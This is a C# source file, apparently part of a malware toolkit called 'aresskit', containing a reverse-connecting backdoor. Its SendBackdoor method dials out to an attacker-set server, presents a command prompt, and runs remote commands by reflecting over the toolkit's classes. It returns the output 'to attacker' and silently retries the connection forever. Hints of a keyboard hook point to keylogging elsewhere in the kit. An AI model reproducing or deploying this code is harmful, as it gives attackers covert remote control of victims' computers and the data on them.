using System;
using System.Linq;
using System.Net.Sockets;
using System.Reflection;

namespace aresskit
{
    class Core
    {
        public static string VicServer { get; set; }
        public static int VicPort { get; set; }
        public static bool HideConsole { get; set; }
        public static string CMDSplitter { get; set; }


        public static void SendBackdoor(string server, int port)
        {
            try
            {
                TcpClient client = new TcpClient(server, port);
                NetworkStream stream = client.GetStream();
                string responseData;

                while (true)
                {
                    byte[] shellcode = Misc.byteCode("aresskit> ");

                    stream.Write(shellcode, 0, shellcode.Length); // Send Shellcode
                    byte[] data = new byte[256]; byte[] output = Misc.byteCode("");

                    // String to store the response ASCII representation.

                    int bytes = stream.Read(data, 0, data.Length);
                    responseData = System.Text.Encoding.ASCII.GetString(data, 0, bytes);
                    responseData = responseData.Replace("\n", string.Empty);

                    if (responseData == "cd")
                        System.IO.Directory.SetCurrentDirectory(responseData.Split(" ".ToCharArray())[1]);
                    else if (responseData == "exit")
                    {   // Disconnect the attacker from the C&C backdoor.

                        client.Close();
                    }
                    else if (responseData == "kill")
                        Environment.Exit(0); // Exit cleanly upon command 'kill'
                    else if (responseData == "help")
                    {
                        string helpMenu = "\n";
                        var theList = Assembly.GetExecutingAssembly().GetTypes().Where(t => t.Namespace == "aresskit").ToList();
                        theList.RemoveAt(theList.IndexOf(typeof(_)));

                        foreach (Type x in theList)
                        {
                            if (x.Name != "<>c" && x.Name != "LowLevelKeyboardProc") // To rid away unused Classes
                                helpMenu += Misc.ShowMethods(x) + "\n";
                        }

                        output = Misc.byteCode(helpMenu);
                    }
                    else
                    {
                        try
                        {
                            if (!responseData.Contains(CMDSplitter))
                            {
                                if (responseData != "")
                                    output = Misc.byteCode("'" + responseData.Replace("\n", "") + "' is not a recognized command.\n");
                            }
                            else
                            {
                                responseData = responseData.Trim(); // To eliminate annoying things in the string

                                // Will produce: (clas name), (method name), [arg](,)[arg]...
                                string[] classMethod = responseData.Split(new[] { CMDSplitter }, StringSplitOptions.None);


                                Type methodType = Type.GetType("aresskit." + classMethod[0]); // Get type: aresskit.Class
                                object classInstance = Activator.CreateInstance(methodType); // Create instance of 'aresskit.Class'

                                string[] methodData = classMethod[1].Split(new char[0]);
                                MethodInfo methodInstance = methodType.GetMethod(methodData[0]);
                                if (methodInstance == null)
                                    output = Misc.byteCode("No such class/method with the name '" + classMethod[0] + CMDSplitter + classMethod[1] + "'");
                                ParameterInfo[] methodParameters = methodInstance.GetParameters();


                                string parameterString = default(string);
                                string[] parameterArray = { "" };

                                if (methodInstance != null)
                                {
                                    if (methodParameters.Length == 0)
                                    {
                                        output = Misc.byteCode(methodInstance.Invoke(classInstance, null) + "\n");
                                    }
                                    else
                                    {
                                        if (methodParameters[0].ParameterType.ToString() == "System.String")
                                        {
                                            for (int i = 1; i < methodData.Length; i++)
                                                parameterString += methodData[i] + " ";
                                            parameterArray[0] = parameterString;
                                        }
                                        output = Misc.byteCode(methodInstance.Invoke(classInstance, parameterArray).ToString() + "\n");
                                    }
                                }
                            }
                        }
                        catch (Exception e)
                        { output = Misc.byteCode(e.Message + "\n"); }
                    }

                    try
                    {
                        stream.Write(output, 0, output.Length); // Send output of command back to attacker.
                    }
                    catch (Exception)
                    {
                        stream.Close();
                        client.Close();
                        break;
                    }
                }

                // Close everything.
                stream.Close();
                client.Close();
            }
            catch (Exception) { while (true) { SendBackdoor(server, port); } } // Pass socket connection silently.
        }
    }
}
